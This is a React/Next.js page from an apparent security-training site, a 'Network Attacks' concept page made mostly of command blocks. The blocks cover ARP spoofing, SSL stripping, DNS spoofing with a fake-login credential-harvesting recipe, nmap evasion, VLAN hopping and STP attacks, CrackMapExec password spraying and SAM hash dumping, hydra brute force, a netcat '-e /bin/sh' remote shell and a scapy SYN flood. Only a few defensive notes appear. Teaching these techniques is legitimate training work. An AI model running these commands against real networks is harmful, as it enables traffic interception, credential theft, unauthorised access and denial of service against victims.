'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#00ffff'
const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem' }}>
    <span style={{ color: '#003a3a', marginRight: '8px' }}>//</span>{children}
  </h2>
)
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a7a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#020a0a', border: `1px solid #003a3a`, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const P = ({ children }: { children: React.ReactNode }) => <p style={{ color: '#8a9a9a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>

export default function NetworkAttacks() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a7a' }}>
        <Link href="/" style={{ color: '#5a7a7a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span><span style={{ color: accent }}>NETWORK ATTACKS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: `rgba(0,255,255,0.08)`, border: `1px solid rgba(0,255,255,0.3)`, borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/network-attacks/lab" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #1a2e2e', borderRadius: '3px', color: '#5a7a7a', fontSize: '8px' }}>LAB →</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a7a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: `0 0 20px rgba(0,255,255,0.35)` }}>NETWORK ATTACKS</h1>
        <p style={{ color: '#5a7a7a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>Packet analysis · ARP spoofing · MITM · DNS poisoning · SSL stripping · VLAN hopping · Network scanning · Lateral movement</p>
      </div>

      <H2>01 — OSI Model Attack Surface Map</H2>
      <Pre label="// WHICH ATTACKS LIVE AT WHICH LAYER">{`# Layer 1 — Physical
# Cable tapping, rogue access point, hardware keylogger

# Layer 2 — Data Link  
# ARP spoofing, MAC flooding, CAM table overflow
# VLAN hopping, STP manipulation, CDP/LLDP abuse
# Tools: arpspoof, macchanger, yersinia

# Layer 3 — Network
# IP spoofing, ICMP redirect, route injection
# BGP hijacking, OSPF poisoning
# Tools: hping3, scapy, nemesis

# Layer 4 — Transport
# TCP SYN flood, session hijacking
# Port scanning, service fingerprinting
# Tools: nmap, hping3, netcat

# Layer 5-7 — Session/Presentation/Application
# SSL stripping, HTTP downgrade, DNS poisoning
# Tools: sslstrip, bettercap, dnschef`}</Pre>

      <H2>02 — Wireshark Mastery</H2>
      <P>Wireshark is the most important tool in network security. Learn to read traffic like a native language.</P>
      <Pre label="// ESSENTIAL WIRESHARK FILTERS FOR SECURITY ANALYSIS">{`# Basic protocol filters:
http          # HTTP traffic only
https         # HTTPS (TLS)
dns           # DNS queries/responses
ftp           # FTP (credentials often cleartext)
telnet        # Telnet (fully cleartext)
smtp          # Email traffic
arp           # ARP — watch for poisoning

# Credential hunting:
http.request.method == "POST"          # Login forms
ftp.request.command == "PASS"          # FTP passwords
pop.request.command == "PASS"          # POP3 passwords

# Find specific IPs:
ip.addr == 192.168.1.100
ip.src == 10.0.0.1 && ip.dst == 10.0.0.2

# Suspicious traffic patterns:
tcp.flags.syn == 1 && tcp.flags.ack == 0   # SYN scan
icmp.type == 8                              # Ping sweep
arp.opcode == 2                             # ARP replies (watch for floods)

# Large data transfers (exfil detection):
frame.len > 1400 && ip.src == INTERNAL_IP

# DNS tunneling detection:
dns && frame.len > 512    # Unusually large DNS packets
dns.qry.name contains "."  # Lots of subdomain lookups

# SSL/TLS issues:
ssl.alert_message.desc == 42   # Bad certificate
tls.handshake.type == 1        # Client Hello (see cipher suites)

# Follow a TCP stream:
# Right-click any packet → Follow → TCP Stream
# This shows the complete conversation`}</Pre>

      <Pre label="// TSHARK — WIRESHARK FROM COMMAND LINE">{`# Install: sudo apt install tshark

# Capture on interface:
tshark -i eth0

# Capture and write to file:
tshark -i eth0 -w capture.pcap

# Read existing capture:
tshark -r capture.pcap

# Filter while capturing:
tshark -i eth0 -Y "http.request.method == POST"

# Extract HTTP credentials:
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.host -e http.request.uri -e urlencoded-form.value

# Extract DNS queries:
tshark -r capture.pcap -Y dns -T fields \
  -e frame.time -e ip.src -e dns.qry.name

# Extract all URLs:
tshark -r capture.pcap -Y http.request \
  -T fields -e http.host -e http.request.uri | sort -u

# Statistics - top talkers:
tshark -r capture.pcap -q -z conv,tcp | head -20

# Detect ARP spoofing:
tshark -r capture.pcap -Y arp -T fields \
  -e arp.src.hw_mac -e arp.src.proto_ipv4 | sort | uniq -d`}</Pre>

      <H2>03 — ARP Spoofing & MITM</H2>
      <P>ARP has no authentication — any machine can claim to be any IP. This is the foundation of most LAN-based attacks.</P>
      <Pre label="// ARP SPOOFING — INTERCEPT ALL TRAFFIC">{`# How ARP works:
# "Who has 192.168.1.1?" → broadcast
# "I have 192.168.1.1, my MAC is AA:BB:CC:DD:EE:FF" → ARP reply
# No verification — anyone can reply with a fake MAC

# ARP spoofing: tell victim "I am the gateway" and tell gateway "I am the victim"
# All traffic now flows through your machine

# OPTION 1: arpspoof (simple)
sudo apt install dsniff
# Enable IP forwarding first (so traffic still reaches destination):
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Poison victim → gateway:
sudo arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
# Poison gateway → victim:
sudo arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# Now capture traffic:
sudo wireshark &
# or: sudo tcpdump -i eth0 host VICTIM_IP

# OPTION 2: bettercap (modern, all-in-one)
sudo apt install bettercap
sudo bettercap

# In bettercap console:
net.probe on          # discover hosts
net.show              # show discovered hosts
set arp.spoof.targets 192.168.1.100  # target specific IP
arp.spoof on          # start spoofing
net.sniff on          # capture traffic

# Bettercap one-liner (caplet):
sudo bettercap -eval "net.probe on; arp.spoof on; net.sniff on"`}</Pre>

      <H2>04 — SSL Stripping</H2>
      <Pre label="// DOWNGRADE HTTPS TO HTTP TO READ ENCRYPTED TRAFFIC">{`# When victim goes to http://bank.com → you redirect to HTTPS
# But victim sees HTTP → you see their credentials

# Setup with bettercap:
sudo bettercap
# In console:
set https.proxy.sslstrip true
https.proxy on
arp.spoof on
net.sniff on

# Legacy: sslstrip (older but educational)
# sudo apt install sslstrip
# 
# 1. Enable forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward
#
# 2. Redirect port 80 traffic to sslstrip:
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#
# 3. Start sslstrip:
sslstrip -l 10000
#
# 4. Start ARP spoof:
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP

# View captured credentials:
tail -f sslstrip.log

# DEFENCE: HSTS (HTTP Strict Transport Security)
# Sites with HSTS preloading cannot be SSL stripped
# Check: https://hstspreload.org`}</Pre>

      <H2>05 — DNS Poisoning & Spoofing</H2>
      <Pre label="// REDIRECT DNS QUERIES TO MALICIOUS SERVERS">{`# DNS has no authentication (DNSSEC rarely implemented)
# Poison the cache → redirect any domain to your IP

# dnschef — DNS proxy/spoofer:
sudo pip install dnschef

# Spoof all queries to your IP:
sudo dnschef --fakeip=YOUR_IP

# Spoof only specific domain:
sudo dnschef --fakedomains=target.com --fakeip=YOUR_IP

# Spoof multiple domains:
sudo dnschef --fakedomains=bank.com,paypal.com --fakeip=YOUR_IP

# With bettercap (more powerful):
sudo bettercap
# Resolve target.com to your IP for all hosts:
set dns.spoof.domains target.com
set dns.spoof.address YOUR_IP
dns.spoof on
arp.spoof on

# DNS cache poisoning (Kaminsky attack):
# 1. Flood DNS resolver with responses for a domain
# 2. If one matches the transaction ID before legitimate response → poisoned
# Requires: predictable transaction IDs (old resolvers)

# Practical use in pentest:
# 1. Create fake login page (clone target.com)
# 2. Host on your machine
# 3. DNS spoof target.com → your IP
# 4. ARP spoof → intercept DNS queries
# 5. Victims get your fake page → harvest credentials`}</Pre>

      <H2>06 — Network Scanning Deep Dive</H2>
      <Pre label="// NMAP BEYOND THE BASICS">{`# Stealth SYN scan (default, requires root):
nmap -sS 192.168.1.0/24

# Full TCP connect (no root needed):
nmap -sT 192.168.1.0/24

# UDP scan (slow but finds SNMP, DNS, TFTP):
nmap -sU --top-ports 100 192.168.1.0/24

# Aggressive scan (OS, version, scripts, traceroute):
nmap -A 192.168.1.0/24

# Scan all 65535 ports:
nmap -p- 192.168.1.100

# Version detection only:
nmap -sV 192.168.1.100

# OS detection:
nmap -O 192.168.1.100

# Script scan (safe scripts):
nmap -sC 192.168.1.100

# Specific scripts:
nmap --script=smb-vuln-* 192.168.1.100        # SMB vulnerabilities
nmap --script=http-title 192.168.1.0/24        # Web page titles
nmap --script=ftp-anon 192.168.1.0/24          # Anonymous FTP
nmap --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.100

# Evasion:
nmap -D RND:10 192.168.1.100          # Decoy scan
nmap -f 192.168.1.100                 # Fragment packets
nmap --source-port 53 192.168.1.100   # Fake source port
nmap -T0 192.168.1.100                # Paranoid slow scan

# Output formats:
nmap -oN output.txt 192.168.1.0/24    # Normal
nmap -oX output.xml 192.168.1.0/24    # XML  
nmap -oG output.gnmap 192.168.1.0/24  # Grepable
nmap -oA output 192.168.1.0/24        # All formats`}</Pre>

      <H2>07 — VLAN Hopping</H2>
      <Pre label="// ESCAPE YOUR VLAN AND ACCESS OTHERS">{`# VLANs are meant to segment networks — attackers can bypass with:
# 1. Switch Spoofing — pretend to be a trunk port
# 2. Double Tagging — add two 802.1Q tags to reach another VLAN

# Tool: yersinia
sudo apt install yersinia
sudo yersinia -G  # GUI mode

# Switch spoofing attack:
# Your NIC sends DTP (Dynamic Trunking Protocol) frames
# Switch negotiates trunk mode → you see all VLANs

# With scapy — double tagging:
from scapy.all import *

# Create double-tagged packet (your VLAN=1, target VLAN=10):
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=10)/IP(dst="10.10.0.1")/ICMP()
sendp(packet, iface="eth0")

# With yersinia — DTP attack:
# sudo yersinia dtp -attack 1  # Enables trunk on switch port

# STP (Spanning Tree Protocol) attack:
# Become root bridge → all traffic flows through you → MITM entire network
sudo yersinia stp -attack 2

# DEFENCE:
# Disable DTP: switchport nonegotiate
# Set ports to access mode: switchport mode access
# Enable BPDU Guard on edge ports`}</Pre>

      <H2>08 — Lateral Movement via Network</H2>
      <Pre label="// MOVE THROUGH THE NETWORK AFTER INITIAL ACCESS">{`# CrackMapExec — Swiss army knife for network lateral movement
pip install crackmapexec

# Enumerate SMB shares:
cme smb 192.168.1.0/24

# Check for null sessions:
cme smb 192.168.1.0/24 --shares

# Spray credentials across subnet:
cme smb 192.168.1.0/24 -u admin -p Password123

# Execute command on multiple hosts:
cme smb 192.168.1.0/24 -u admin -p Password123 -x "whoami"

# Dump SAM hashes (requires admin):
cme smb 192.168.1.0/24 -u admin -p Password123 --sam

# Check WinRM (PowerShell remoting):
cme winrm 192.168.1.0/24 -u admin -p Password123

# SSH brute force with hydra:
hydra -L users.txt -P passwords.txt 192.168.1.0/24 ssh -t 4

# Netcat pivot (tunnel traffic through compromised host):
# On compromised host: nc -lvp 4444 -e /bin/sh
# From your machine: nc COMPROMISED_IP 4444

# SSH tunneling:
# Local port forward (access internal service):
ssh -L 8080:INTERNAL_HOST:80 user@COMPROMISED_HOST

# Dynamic SOCKS proxy (route all traffic through):
ssh -D 9050 user@COMPROMISED_HOST
# Then: proxychains nmap -sT INTERNAL_RANGE`}</Pre>

      <H2>09 — Packet Crafting with Scapy</H2>
      <Pre label="// BUILD ANY PACKET FROM SCRATCH">{`# Install: pip install scapy
# Run: sudo python3 / from scapy.all import *

# Basic ICMP ping:
send(IP(dst="8.8.8.8")/ICMP())

# TCP SYN packet:
send(IP(dst="192.168.1.1")/TCP(dport=80, flags="S"))

# SYN flood:
send(IP(dst="TARGET", src=RandIP())/TCP(dport=80, flags="S"), loop=1, verbose=0)

# Custom DNS query:
send(IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com")))

# ARP who-has:
ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2, verbose=0)
for sent, received in ans:
    print(f"{received.psrc} - {received.hwsrc}")

# Sniff traffic:
sniff(filter="tcp port 80", prn=lambda x: x.show(), count=10)

# Sniff and extract HTTP hosts:
def http_header(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors="ignore")
        if "Host:" in payload:
            print(payload.split("Host:")[1].split("\\n")[0].strip())

sniff(filter="tcp port 80", prn=http_header)`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: `1px solid #003a3a`, display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a7a' }}>← DASHBOARD</Link>
        <Link href="/modules/network-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: accent, padding: '8px 20px', border: `1px solid rgba(0,255,255,0.4)`, borderRadius: '4px', background: `rgba(0,255,255,0.06)` }}>PROCEED TO LAB →</Link>
      </div>
    </div>
  )
}
